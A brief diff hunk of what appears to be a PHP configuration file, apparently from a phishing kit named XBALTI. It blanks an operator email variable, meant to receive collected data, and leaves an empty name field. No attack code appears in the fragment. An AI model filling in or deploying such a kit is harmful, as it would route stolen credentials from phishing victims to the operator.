@@ -23,7 +23,7 @@
       |       |            |                     
 */
 
-$XBALTI_EMAIL = "urmom@gmail.com"; // Your Email Here :)
+$XBALTI_EMAIL = ""; // Your Email Here :)
 
 $yourname = ""; // Your Name Here :)
 
